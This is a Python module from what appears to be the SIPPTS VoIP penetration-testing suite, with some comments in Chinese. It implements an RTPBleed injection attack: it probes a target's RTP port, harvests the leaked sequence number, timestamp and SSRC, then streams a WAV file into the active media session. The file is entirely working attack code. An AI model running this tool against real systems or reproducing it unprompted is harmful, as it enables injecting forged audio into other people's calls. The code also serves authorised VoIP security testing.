#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "Jose Luis Verdeguer"
__version__ = "4.1"
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2024, SIPPTS"
__email__ = "pepeluxx@gmail.com"

import socket
import os
import sys
import time
import platform
from .lib.color import Color
from .lib.logos import Logo

# RTP负载类型定义
RTP_PAYLOAD_TYPES = {
    "0 PCMU (audio)": 0,
    "3 GSM (audio)": 3,
    "4 G723 (audio)": 4,
    "5 DVI4 (audio)": 5,
    "6 DVI4 (audio)": 6,
    "7 LPC (audio)": 7,
    "8 PCMA (audio)": 8,
    "9 G722 (audio)": 9,
    "10 L16 (audio)": 10,
    "11 L16 (audio)": 11,
    "12 QCELP (audio)": 12,
    "13 CN (audio)": 13,
    "14 MPA (audio)": 14,
    "15 G728 (audio)": 15,
    "16 DVI4 (audio)": 16,
    "17 DVI4 (audio)": 17,
    "18 G729 (audio)": 18,
    "25 CELLB (video)": 25,
    "26 JPEG (video)": 26,
    "28 nv (video)": 28,
    "31 H261 (video)": 31,
    "32 MPV (video)": 32,
    "33 MP2T (audio/video)": 33,
    "34 H263 (video)": 34
}

class RTPBleedInject:
    def __init__(self):
        self.ip = "192.168.4.200"
        self.port = "10042"
        self.payload = "0 PCMU (audio)"  # 修改默认值为完整描述
        self.file = "test.wav"
        self.loop = False
        self.force = False

        self.run = True

        self.c = Color()

    def stop(self):
        print(self.c.WHITE)
        self.run = False

    def start(self):
        self.port = int(self.port)
        # 获取负载类型的数值
        payload_value = RTP_PAYLOAD_TYPES[self.payload]

        logo = Logo("rtpbleedinject")
        logo.print()

        print(f"{self.c.BWHITE}[✓] Target IP: {self.c.YELLOW}{self.ip}")
        print(
            f"{self.c.BWHITE}[✓] Remote port: {self.c.YELLOW}{self.c.YELLOW}{str(self.port)}"
        )
        print(f"{self.c.BWHITE}[✓] Payload type: {self.c.YELLOW}{self.payload}")
        print(f"{self.c.BWHITE}[✓] WAV file {self.c.YELLOW}{self.file}")
        print(f"{self.c.BWHITE}[✓] Loop mode: {self.c.YELLOW}{'Enabled' if self.loop else 'Disabled'}")
        print(self.c.WHITE)

        print(f"{self.c.YELLOW}[+] Reading WAV file ...{self.c.WHITE}")

        try:
            file = open(self.file, "rb")
            data = file.read()
            file.close()
            print(
                f"{self.c.YELLOW}[+] Sending RTP packets to {self.c.CYAN}{self.ip}{self.c.WHITE}:{self.c.CYAN}{str(self.port)}{self.c.WHITE} to obtain info about the streams{self.c.WHITE}"
            )
        except:
            print(f"{self.c.RED}Error opening file {self.file}")
            print(self.c.WHITE)
            exit()

        # Create a UDP socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # 根据操作系统设置非阻塞模式
            if platform.system() != 'Windows':
                import fcntl
                fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)
            else:
                sock.setblocking(False)
                
        except socket.error:
            print(f"{self.c.RED}Failed to create socket")
            print(self.c.WHITE)
            sys.exit(1)

        host = (str(self.ip), self.port)
        nloop = 0
        size = 0

        while size < 12 and self.run == True:
            try:
                nloop += 1
                cloop = hex(nloop)[2:]
                cloop = cloop.zfill(4)
                cpayload = "%s" % hex(0x80 | payload_value & 0x7F)[2:]
                # byte[0] = 0x80 => RTP version 2
                # byte[1] = 0x80+payload => Codec version (https://en.wikipedia.org/wiki/RTP_payload_formats)
                # byte[2-3] = Sequence number
                message = "80" + cpayload + cloop + "0000000000000000"
                byte_array = bytearray.fromhex(message)

                if nloop == 65535:
                    nloop = 1

                # Send data
                print(f"{self.c.YELLOW}[+] Sending RTP packets now!{self.c.WHITE}")
                sock.sendto(byte_array, host)
                
                msg = None  # 初始化msg变量
                
                try:
                    (msg, addr) = sock.recvfrom(4096)
                except BlockingIOError:
                    # 如果是非阻塞错误，继续尝试接收
                    if not self.force:
                        continue

                (ipaddr, rport) = host
                if msg is not None:
                    size = len(msg)
                    msg = msg.hex()
                else:
                    # 如果msg为None，生成一个25字节长的全0数组
                    size = 25
                    msg = '00' * size

                if size >= 12 or self.force:
                    seq = msg[4:8]
                    timestamp = msg[8:16]
                    ssrc = msg[16:24]
                    version = "80" + cpayload

                    print(
                        f"{self.c.WHITE} received {str(size)} bytes from target port {str(rport)} with seq number {seq}"
                    )
                    print(f"{self.c.BWHITE}[-] Current Seq: {self.c.GREEN}{seq}")
                    print(
                        f"{self.c.BWHITE}[-] Current Timestamp: {self.c.GREEN}{timestamp}"
                    )
                    print(f"{self.c.BWHITE}[-] SSRC: {self.c.GREEN}{ssrc}")
                    print(f"{self.c.BWHITE}[-] Version: {self.c.GREEN}{version}")

                    total = len(data) * 2
                    cont = 0
                    hexdata = data.hex()
                    size = 160
                    SAMPLE_RATE = 8000  # 标准8kHz采样率
                    SAMPLES_PER_PACKET = size // 1  # 80个采样点

                    print(f"{self.c.YELLOW}[+] Injecting RTP audio ...{self.c.WHITE}")

                    while self.run == True:
                        if not self.run:
                            print(f"\n{self.c.YELLOW}[!] Stopping RTP injection...{self.c.WHITE}")
                            break

                        packet = hexdata[cont : cont + (size * 2)]

                        nseq = int("%s" % seq, base=16) + 1
                        seq = hex(nseq)[2:].zfill(4)

                        ntimestamp = int("%s" % timestamp, base=16) + SAMPLES_PER_PACKET
                        timestamp = hex(ntimestamp)[2:].zfill(8)

                        print(
                            f"{self.c.YELLOW}[+] Sending packet {str(cont)} of {str(total)} (version: {version}, seq: {seq}, timestamp: {timestamp}, ssrc: {ssrc})",
                            end="\r",
                        )

                        # packet_bytes = 2+2+4+8+8+360 = 24 + 320 = 344
                        packet_bytes = "%s%s%s%s%s" % (
                            version,
                            seq,
                            timestamp,
                            ssrc,
                            packet,
                        )
                        byte_array = bytearray.fromhex(packet_bytes)
                        # Send data
                        try:
                            sock.sendto(byte_array, host)
                            time.sleep(SAMPLES_PER_PACKET / SAMPLE_RATE)
                        except socket.error as e:
                            print(f"\n{self.c.RED}[!] Socket error: {e}{self.c.WHITE}")
                            self.run = False
                            break
                        
                        cont += size * 2
                        
                        # 如果到达文件末尾且启用了循环模式，则重置计数器继续发送
                        if cont >= total:
                            if self.loop:
                                print(f"\n{self.c.YELLOW}[+] Restarting audio file...{self.c.WHITE}")
                                cont = 0
                            else:
                                break

                    if not self.run:
                        break

            except KeyboardInterrupt:
                print(f"\n{self.c.YELLOW}[!] Keyboard interrupt received{self.c.WHITE}")
                self.run = False
            except Exception as e:
                print(f"{self.c.YELLOW}[+] Exception: {e}{self.c.WHITE}")
                pass

        print(f"\n{self.c.YELLOW}[+] Closing connection...{self.c.WHITE}")
        sock.close()
